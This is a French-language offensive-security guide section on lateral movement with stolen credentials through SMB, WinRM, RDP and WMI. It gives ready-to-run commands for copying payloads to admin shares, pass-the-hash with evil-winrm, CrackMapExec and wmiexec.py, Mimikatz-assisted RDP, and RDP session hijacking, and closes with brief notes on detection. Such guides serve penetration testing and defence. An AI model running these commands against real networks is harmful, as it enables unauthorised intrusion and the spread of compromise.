# VI.C. Exploitation de Services Réseau (SMB, WinRM, RDP, WMI)

Une fois que des credentials valides (en clair, hash NTLM, ou ticket Kerberos) ont été obtenus pour un compte ayant des droits sur des machines distantes, plusieurs services réseau standards peuvent être utilisés pour le mouvement latéral.

## 1. SMB (Server Message Block) / CIFS (Common Internet File System)

*   **Protocole :** Partage de fichiers, d'imprimantes, et accès aux IPC (Inter-Process Communication) nommés comme `srvsvc` (utilisé par PsExec).
*   **Ports :** TCP 445, TCP 139 (NetBIOS).
*   **Mouvement Latéral via SMB :**
    *   **Accès aux Partages Administratifs (`C$`, `ADMIN$`, `IPC$`) :**
        Permet de lire/écrire des fichiers sur le système de fichiers distant (si l'utilisateur a les droits admin locaux). Utile pour uploader des outils/payloads et exfiltrer des données.
        ```bash
        # Windows
        net use Z: \\<IP_CIBLE_OU_NOM>\C$ /user:<DOMAINE>\<UTILISATEUR> <MOT_DE_PASSE>
        copy payload.exe Z:\Windows\Temp\
        # Avec Pass-the-Hash (via Mimikatz pth)
        # Dans le cmd lancé par pth:
        dir \\<IP_CIBLE_OU_NOM>\C$

        # Linux (smbclient)
        smbclient \\\\<IP_CIBLE_OU_NOM>\\C$ -U <DOMAINE>/<UTILISATEUR>%<MOT_DE_PASSE>
        # smbclient ... -c "put payload.exe \Windows\Temp\payload.exe"
        ```
    *   **Exécution de Commandes via des Services (ex: PsExec, smbexec) :**
        Ces outils utilisent SMB pour uploader un binaire de service, créer et démarrer un service temporaire sur la machine cible, qui exécute ensuite la commande souhaitée. Nécessite des droits d'admin local.
        (Voir [VI.D Outils d'Administration à Distance](./D-outils-administration-distante.md))

## 2. WinRM (Windows Remote Management) / PowerShell Remoting

*   **Protocole :** Basé sur HTTP/HTTPS (WS-Management), permet l'exécution de commandes PowerShell à distance.
*   **Ports :** TCP 5985 (HTTP), TCP 5986 (HTTPS).
*   **Prérequis :** WinRM doit être activé et configuré sur la machine cible. L'utilisateur doit être membre du groupe "Administrateurs" local ou "Remote Management Users".
*   **Mouvement Latéral via WinRM :**
    *   **Commandes PowerShell (Windows) :**
        ```powershell
        # Entrer dans une session interactive
        Enter-PSSession -ComputerName <IP_CIBLE_OU_NOM> -Credential (Get-Credential)
        # Exécuter une commande unique
        Invoke-Command -ComputerName <IP_CIBLE_OU_NOM> -ScriptBlock { Get-Process } -Credential (Get-Credential)
        # Avec Pass-the-Hash (nécessite des configurations spécifiques ou des outils comme Invoke-CommandAs)
        ```
    *   **evil-winrm (Ruby Gem - Linux/Windows) :**
        Outil populaire pour interagir avec WinRM, supporte les hashes NTLM.
        ```bash
        evil-winrm -i <IP_CIBLE> -u <UTILISATEUR> -p <MOT_DE_PASSE>
        evil-winrm -i <IP_CIBLE> -u <UTILISATEUR> -H <HASH_NTLM>
        ```
    *   **CrackMapExec (module `winrm`) :**
        ```bash
        crackmapexec winrm <IP_CIBLE_OU_PLAGE> -u <UTILISATEUR> -p <MOT_DE_PASSE> -x "whoami"
        crackmapexec winrm <IP_CIBLE_OU_PLAGE> -u <UTILISATEUR> -H <HASH_NTLM> -x "ipconfig"
        ```

## 3. RDP (Remote Desktop Protocol)

*   **Protocole :** Accès graphique à distance.
*   **Port :** TCP 3389.
*   **Prérequis :** RDP doit être activé sur la cible. L'utilisateur doit être membre du groupe "Remote Desktop Users" (ou "Administrateurs").
*   **Mouvement Latéral via RDP :**
    *   Connexion directe avec des credentials valides.
        ```bash
        # Windows
        mstsc /v:<IP_CIBLE_OU_NOM>
        # Linux (xfreerdp)
        xfreerdp /v:<IP_CIBLE_OU_NOM> /u:<UTILISATEUR> /p:<MOT_DE_PASSE> /d:<DOMAINE>
        ```
    *   **Pass-the-Hash avec RDP (Restricted Admin Mode) :**
        Si le mode "Restricted Admin" (`/restrictedadmin`) est utilisé côté client et activé côté serveur, la connexion RDP s'effectue sans envoyer les credentials en clair, en utilisant l'authentification réseau actuelle (qui peut provenir d'un PtH ou PtT).
        ```
        # Dans un cmd lancé via Mimikatz pth:
        mstsc /v:<IP_CIBLE_OU_NOM> /restrictedadmin
        ```
    *   **Vol de sessions RDP existantes / RDP Hijacking :**
        Si l'attaquant a des privilèges SYSTEM sur une machine où des sessions RDP sont actives, il peut potentiellement détourner ces sessions.
        Outils : `tscon` (natif), Mimikatz (`ts::sessions`, `ts::remote`).

## 4. WMI (Windows Management Instrumentation)

*   **Protocole :** Infrastructure pour la gestion des données et des opérations sur les systèmes Windows. Peut être utilisé à distance.
*   **Ports :** Utilise RPC, initialement via le port TCP 135 (RPC Endpoint Mapper), puis des ports dynamiques RPC (1024-65535, ou 49152-65535 sur les systèmes plus récents). Le pare-feu doit autoriser le trafic WMI.
*   **Prérequis :** L'utilisateur doit avoir des droits d'admin local sur la cible.
*   **Mouvement Latéral via WMI :**
    *   **Commandes WMI (Windows - `wmic`) :**
        ```powershell
        # Exécuter un processus à distance
        wmic /node:<IP_CIBLE_OU_NOM> /user:<DOMAINE>\<UTILISATEUR> /password:<MOT_DE_PASSE> process call create "cmd.exe /c whoami > C:\Windows\Temp\out.txt"
        ```
    *   **PowerShell Remoting via WMI :**
        ```powershell
        Invoke-WmiMethod -ComputerName <IP_CIBLE_OU_NOM> -Namespace root\cimv2 -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -Credential (Get-Credential)
        ```
    *   **Impacket (wmiexec.py - Linux) :**
        Fournit un shell semi-interactif.
        ```bash
        wmiexec.py <DOMAINE>/<UTILISATEUR>:<MOT_DE_PASSE>@<IP_CIBLE>
        wmiexec.py <DOMAINE>/<UTILISATEUR>@<IP_CIBLE> -hashes aad3b435b51404eeaad3b435b51404ee:<HASH_NTLM>
        ```
    *   **CrackMapExec (module `wmi`) :**
        ```bash
        crackmapexec wmi <IP_CIBLE_OU_PLAGE> -u <UTILISATEUR> -p <MOT_DE_PASSE> -x "hostname"
        ```

## Considérations
*   **Pare-feu :** Les pare-feu (Windows ou réseau) peuvent bloquer ces ports/protocoles.
*   **Détection :** Les connexions et exécutions de commandes à distance sont souvent journalisées (journaux de sécurité Windows, Sysmon, journaux WinRM). Une activité anormale peut être détectée.
*   **Privilèges :** La plupart de ces techniques nécessitent des privilèges d'administrateur local sur la machine cible.

Choisir la bonne technique dépend des services disponibles, des credentials obtenus, et du niveau de furtivité souhaité. 